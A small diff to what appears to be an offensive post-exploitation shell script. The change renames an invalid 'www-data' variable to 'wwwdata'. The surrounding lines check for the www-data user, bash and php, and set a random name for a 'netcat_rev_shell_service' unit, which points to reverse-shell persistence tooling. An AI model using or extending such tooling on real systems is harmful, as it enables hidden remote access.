@@ -11,7 +11,7 @@ fi
 
 if $(id | grep -qi "www-data");
 then
-	www-data="yes"
+	wwwdata="yes"
 fi
 
 if $(which bash | grep -qi bash);
@@ -58,7 +58,7 @@ then
 	export netcat_rev_shell_service=$(strings /dev/urandom | grep ^[A-Za-z0-9]*$ | head -n 1).service
 fi
 
-if [ "$www-data" == "yes" ];
+if [ "$wwwdata" == "yes" ];
 then
 	if [ "$php" == "yes" ];
 	then 
